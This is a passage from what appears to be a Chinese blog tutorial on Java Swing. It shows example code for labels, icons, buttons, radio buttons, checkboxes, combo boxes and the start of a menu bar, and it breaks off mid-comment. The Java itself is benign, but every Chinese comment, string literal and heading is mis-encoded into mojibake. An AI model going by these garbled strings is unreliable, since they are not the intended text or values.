è®¾ç½®å­—ä½“å¤§å°ä»¥ä¾¿è§‚å¯Ÿæ•ˆæœ</span><br>        <span class="hljs-type">Font</span> <span class="hljs-variable">labelFont</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(<span class="hljs-string">&quot;å¾®è½¯é›…é»‘&quot;</span>, Font.PLAIN, <span class="hljs-number">18</span>);<br>        leftLabel.setFont(labelFont);<br>        centerLabel.setFont(labelFont);<br>        rightLabel.setFont(labelFont);<br><br>        <span class="hljs-comment">// è®¾ç½®èƒŒæ™¯è‰²å’Œè¾¹æ¡†ä»¥ä¾¿è§‚å¯Ÿå¯¹é½æ•ˆæœ</span><br>        leftLabel.setOpaque(<span class="hljs-literal">true</span>);<br>        centerLabel.setOpaque(<span class="hljs-literal">true</span>);<br>        rightLabel.setOpaque(<span class="hljs-literal">true</span>);<br><br>        leftLabel.setBackground(Color.LIGHT_GRAY);<br>        centerLabel.setBackground(Color.GRAY);<br>        rightLabel.setBackground(Color.DARK_GRAY);<br><br>        leftLabel.setForeground(Color.WHITE);<br>        centerLabel.setForeground(Color.WHITE);<br>        rightLabel.setForeground(Color.WHITE);<br><br>        <span class="hljs-comment">// æ·»åŠ åˆ°çª—å£</span><br>        frame.add(leftLabel);<br>        frame.add(centerLabel);<br>        frame.add(rightLabel);<br><br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2-å›¾æ ‡"><a href="#4-2-å›¾æ ‡" class="headerlink" title="4.2 å›¾æ ‡"></a>4.2 å›¾æ ‡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºå›¾æ ‡</span><br><span class="hljs-type">ImageIcon</span> <span class="hljs-variable">icon</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageIcon</span>(<span class="hljs-string">&quot;image.png&quot;</span>);<br><br><span class="hljs-comment">// è®¾ç½®ç»„ä»¶å›¾æ ‡</span><br>label.setIcon(icon);<br>button.setIcon(icon);<br></code></pre></td></tr></table></figure><h3 id="4-3-æŒ‰é’®"><a href="#4-3-æŒ‰é’®" class="headerlink" title="4.3 æŒ‰é’®"></a>4.3 æŒ‰é’®</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºæŒ‰é’®</span><br><span class="hljs-type">JButton</span> <span class="hljs-variable">button1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;æ–‡å­—æŒ‰é’®&quot;</span>);<br><span class="hljs-type">JButton</span> <span class="hljs-variable">button2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(icon);<br><span class="hljs-type">JButton</span> <span class="hljs-variable">button3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;å›¾æ–‡æŒ‰é’®&quot;</span>, icon);<br><br><span class="hljs-comment">// è®¾ç½®æŒ‰é’®å±æ€§</span><br>button.setToolTipText(<span class="hljs-string">&quot;æç¤ºæ–‡å­—&quot;</span>);<br>button.setBorderPainted(<span class="hljs-literal">false</span>); <span class="hljs-comment">// ä¸æ˜¾ç¤ºè¾¹æ¡†</span><br>button.setEnabled(<span class="hljs-literal">true</span>);        <span class="hljs-comment">// è®¾ç½®å¯ç”¨æ€§</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;Frame&quot;</span>);<br>        jf.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        jf.setBounds(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºæŒ‰é’®</span><br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">jb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;æŒ‰é’®1&quot;</span>);<br>        jb.setEnabled(<span class="hljs-literal">true</span>);<br>        jb.setBorderPainted(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// ä¸ç»˜åˆ¶è¾¹æ¡†</span><br><br>        <span class="hljs-comment">// å°†æŒ‰é’®æ·»åŠ åˆ°çª—å£</span><br>        jf.add(jb);<br><br>        <span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œå¹¶æ˜¾ç¤ºçª—å£</span><br>        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-4-å•é€‰æŒ‰é’®ç»„ä»¶"><a href="#4-4-å•é€‰æŒ‰é’®ç»„ä»¶" class="headerlink" title="4.4 å•é€‰æŒ‰é’®ç»„ä»¶"></a>4.4 å•é€‰æŒ‰é’®ç»„ä»¶</h3><p>JRaddioButtonæ˜¯ä¸€ä¸ªå•é€‰æŒ‰é’®ï¼Œéœ€è¦å°†å•é€‰æŒ‰é’®åŠ å…¥åˆ°æŒ‰é’®ç»„ä¸­ã€‚ç”¨äºåœ¨å¤šä¸ªäº’æ–¥é€‰é¡¹ä¸­é€‰æ‹©ä¸€ä¸ªä¸”åªèƒ½é€‰æ‹©ä¸€ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºå•é€‰æŒ‰é’®</span><br><span class="hljs-type">JRadioButton</span> <span class="hljs-variable">radio1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;é€‰é¡¹1&quot;</span>);<br><span class="hljs-type">JRadioButton</span> <span class="hljs-variable">radio2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;é€‰é¡¹2&quot;</span>);<br><br><span class="hljs-comment">// åˆ›å»ºæŒ‰é’®ç»„å®ç°å•é€‰</span><br><span class="hljs-type">ButtonGroup</span> <span class="hljs-variable">group</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ButtonGroup</span>();<br>group.add(radio1);<br>group.add(radio2);<br><br><span class="hljs-comment">// æ·»åŠ åˆ°å®¹å™¨</span><br>panel.add(radio1);<br>panel.add(radio2);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> java.awt.event.ActionEvent;<br><span class="hljs-keyword">import</span> java.awt.event.ActionListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;å•é€‰æŒ‰é’®ç¤ºä¾‹&quot;</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setSize(<span class="hljs-number">300</span>, <span class="hljs-number">250</span>);<br>        frame.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br><br>        <span class="hljs-comment">// ç¤ºä¾‹1ï¼šæ€§åˆ«é€‰æ‹©</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">genderLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;è¯·é€‰æ‹©æ€§åˆ«ï¼š&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">maleBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;ç”·&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">femaleBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;å¥³&quot;</span>);<br><br>        <span class="hljs-type">ButtonGroup</span> <span class="hljs-variable">genderGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ButtonGroup</span>();<br>        genderGroup.add(maleBtn);<br>        genderGroup.add(femaleBtn);<br><br>        <span class="hljs-comment">// ç¤ºä¾‹2ï¼šæ”¯ä»˜æ–¹å¼é€‰æ‹©</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">paymentLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;è¯·é€‰æ‹©æ”¯ä»˜æ–¹å¼ï¼š&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">wechatBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;å¾®ä¿¡æ”¯ä»˜&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">alipayBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;æ”¯ä»˜å®&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">bankBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;é“¶è¡Œå¡&quot;</span>);<br><br>        <span class="hljs-type">ButtonGroup</span> <span class="hljs-variable">paymentGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ButtonGroup</span>();<br>        paymentGroup.add(wechatBtn);<br>        paymentGroup.add(alipayBtn);<br>        paymentGroup.add(bankBtn);<br><br>        <span class="hljs-comment">// ç¤ºä¾‹3ï¼šé¢œè‰²é€‰æ‹©</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">colorLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;è¯·é€‰æ‹©å–œæ¬¢çš„é¢œè‰²ï¼š&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">redBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;çº¢è‰²&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">blueBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;è“è‰²&quot;</span>);<br>        <span class="hljs-type">JRadioButton</span> <span class="hljs-variable">greenBtn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRadioButton</span>(<span class="hljs-string">&quot;ç»¿è‰²&quot;</span>);<br><br>        <span class="hljs-type">ButtonGroup</span> <span class="hljs-variable">colorGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ButtonGroup</span>();<br>        colorGroup.add(redBtn);<br>        colorGroup.add(blueBtn);<br>        colorGroup.add(greenBtn);<br><br>        <span class="hljs-comment">// æ·»åŠ äº‹ä»¶ç›‘å¬å™¨</span><br>        <span class="hljs-type">ActionListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionListener</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">actionPerformed</span><span class="hljs-params">(ActionEvent e)</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;é€‰ä¸­äº†: &quot;</span> + ((JRadioButton)e.getSource()).getText());<br>            &#125;<br>        &#125;;<br><br>        maleBtn.addActionListener(listener);<br>        femaleBtn.addActionListener(listener);<br>        wechatBtn.addActionListener(listener);<br>        alipayBtn.addActionListener(listener);<br>        bankBtn.addActionListener(listener);<br>        redBtn.addActionListener(listener);<br>        blueBtn.addActionListener(listener);<br>        greenBtn.addActionListener(listener);<br><br>        <span class="hljs-comment">// æ·»åŠ åˆ°çª—å£</span><br>        frame.add(genderLabel);<br>        frame.add(maleBtn);<br>        frame.add(femaleBtn);<br><br>        frame.add(paymentLabel);<br>        frame.add(wechatBtn);<br>        frame.add(alipayBtn);<br>        frame.add(bankBtn);<br><br>        frame.add(colorLabel);<br>        frame.add(redBtn);<br>        frame.add(blueBtn);<br>        frame.add(greenBtn);<br><br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-5-å¤é€‰ç»„ä»¶æ¡†"><a href="#4-5-å¤é€‰ç»„ä»¶æ¡†" class="headerlink" title="4.5 å¤é€‰ç»„ä»¶æ¡†"></a>4.5 å¤é€‰ç»„ä»¶æ¡†</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºå¤é€‰æ¡†</span><br><span class="hljs-type">JCheckBox</span> <span class="hljs-variable">check1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JCheckBox</span>(<span class="hljs-string">&quot;é€‰é¡¹1&quot;</span>);<br><span class="hljs-type">JCheckBox</span> <span class="hljs-variable">check2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JCheckBox</span>(<span class="hljs-string">&quot;é€‰é¡¹2&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// é»˜è®¤é€‰ä¸­</span><br><span class="hljs-type">JCheckBox</span> <span class="hljs-variable">check3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JCheckBox</span>(<span class="hljs-string">&quot;é€‰é¡¹3&quot;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// æ·»åŠ åˆ°å®¹å™¨</span><br>panel.add(check1);<br>panel.add(check2);<br>panel.add(check3);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main8</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;Frame&quot;</span>);<br>        jf.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        jf.setBounds(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºå¤é€‰æ¡†</span><br>        <span class="hljs-type">JCheckBox</span> <span class="hljs-variable">jcb1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JCheckBox</span>(<span class="hljs-string">&quot;ç¯®çƒ&quot;</span>);<br>        <span class="hljs-type">JCheckBox</span> <span class="hljs-variable">jcb2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JCheckBox</span>(<span class="hljs-string">&quot;éŸ³ä¹&quot;</span>);<br>        <span class="hljs-type">JCheckBox</span> <span class="hljs-variable">jcb3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JCheckBox</span>(<span class="hljs-string">&quot;ä»£ç &quot;</span>);<br>        <span class="hljs-type">JCheckBox</span> <span class="hljs-variable">jcb4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JCheckBox</span>(<span class="hljs-string">&quot;ç¡è§‰&quot;</span>);<br><br>        <span class="hljs-comment">// å°†å¤é€‰æ¡†æ·»åŠ åˆ°çª—å£</span><br>        jf.add(jcb1);<br>        jf.add(jcb2);<br>        jf.add(jcb3);<br>        jf.add(jcb4);<br><br>        <span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œå¹¶æ˜¾ç¤ºçª—å£</span><br>        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-6-ä¸‹æ‹‰åˆ—è¡¨æ¡†ç»„ä»¶"><a href="#4-6-ä¸‹æ‹‰åˆ—è¡¨æ¡†ç»„ä»¶" class="headerlink" title="4.6 ä¸‹æ‹‰åˆ—è¡¨æ¡†ç»„ä»¶"></a>4.6 ä¸‹æ‹‰åˆ—è¡¨æ¡†ç»„ä»¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºä¸‹æ‹‰æ¡†</span><br>JComboBox&lt;String&gt; comboBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JComboBox</span>&lt;&gt;();<br><br><span class="hljs-comment">// æ·»åŠ é€‰é¡¹</span><br>comboBox.addItem(<span class="hljs-string">&quot;é€‰é¡¹1&quot;</span>);<br>comboBox.addItem(<span class="hljs-string">&quot;é€‰é¡¹2&quot;</span>);<br>comboBox.addItem(<span class="hljs-string">&quot;é€‰é¡¹3&quot;</span>);<br><br><span class="hljs-comment">// è®¾ç½®é»˜è®¤é€‰ä¸­é¡¹</span><br>comboBox.setSelectedIndex(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main9</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;Frame&quot;</span>);<br>        jf.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        jf.setBounds(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">300</span>, <span class="hljs-number">100</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºä¸‹æ‹‰æ¡†å¹¶æ·»åŠ é€‰é¡¹</span><br>        JComboBox&lt;String&gt; box = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JComboBox</span>&lt;&gt;();<br>        box.addItem(<span class="hljs-string">&quot;--è¯·é€‰æ‹©ä½ çš„å­¦å†--&quot;</span>);<br>        box.addItem(<span class="hljs-string">&quot;é«˜ä¸­&quot;</span>);<br>        box.addItem(<span class="hljs-string">&quot;å¤§å­¦&quot;</span>);<br>        box.addItem(<span class="hljs-string">&quot;ç ”ç©¶ç”Ÿ&quot;</span>);<br><br>        <span class="hljs-comment">// å°†ä¸‹æ‹‰æ¡†æ·»åŠ åˆ°çª—å£</span><br>        jf.add(box);<br><br>        <span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œå¹¶æ˜¾ç¤ºçª—å£</span><br>        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-7-èœå•æ "><a href="#4-7-èœå•æ " class="headerlink" title="4.7 èœå•æ "></a>4.7 èœå•æ </h3><p>ä¸€çº§èœå•çš„ï¼š<br>1åˆ›å»ºèœå•æ¡JMenuBar<br>2åˆ›å»ºèœå•JMenu<br>3åˆ›å»ºèœå•é¡¹JMenuItem<br>æ€»ç»“ï¼šèœå•é¡¹ä¾é™„èœå•ï¼Œèœå•ä¾é™„èœå•æ¡<br>èœå•é¡¹ï¼ˆJMenuItemï¼‰å¿…é¡»æ”¾åœ¨èœå•ï¼ˆJMenuï¼‰é‡Œï¼Œè€Œèœå•ï¼ˆJMenuï¼‰å¿…é¡»æ”¾åœ¨èœå•æ¡ï¼ˆJMenuBarï¼‰é‡Œã€‚<br>ç„¶åï¼Œèœå•æ¡ï¼ˆJMenuBarï¼‰è¢«è®¾ç½®åˆ°çª—å£ï¼ˆJFrameï¼‰ä¸Šã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬å»ºç«‹èœå•çš„æ­¥éª¤æ˜¯ï¼š</p><ol><li>åˆ›å»ºèœå•æ¡ï¼ˆJMenuBarï¼‰</li><li>åˆ›å»ºèœå•ï¼ˆJMenuï¼‰ï¼Œå¹¶æ·»åŠ åˆ°èœå•æ¡</li><li>åˆ›å»ºèœå•é¡¹ï¼ˆJMenuItemï¼‰ï¼Œå¹¶æ·»åŠ åˆ°èœå•</li></ol><p>æœ€åï¼Œå°†èœå•æ¡è®¾ç½®åˆ°çª—å£ä¸Šï¼ˆä½¿ç”¨setJMenuBaræ–¹æ³•ï¼‰ã€‚</p><p>JMenuBar (èœå•æ¡)<br>    â†“<br>JMenu (ä¸»èœå•)<br>    â†“<br>JMenuItem (èœå•é¡¹)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>();<br><span class="hljs-type">JMenuBar</span> <span class="hljs-variable">bar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuBar</span>();      <span class="hljs-comment">// åœ°åŸº</span><br><span class="hljs-type">JMenu</span> <span class="hljs-variable">menu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenu</span>(<span class="hljs-string">&quot;æ–‡ä»¶&quot;</span>);      <span class="hljs-comment">// æ¥¼å±‚ï¼ˆä¾é™„åœ°åŸºï¼‰</span><br><span class="hljs-type">JMenuItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;æ–°å»º&quot;</span>); <span class="hljs-comment">// æˆ¿é—´ï¼ˆä¾é™„æ¥¼å±‚ï¼‰</span><br><br>menu.add(item);     <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šæˆ¿é—´â†’æ¥¼å±‚</span><br>bar.add(menu);      <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šæ¥¼å±‚â†’åœ°åŸº  </span><br>frame.setJMenuBar(bar); <span class="hljs-comment">// âœ… 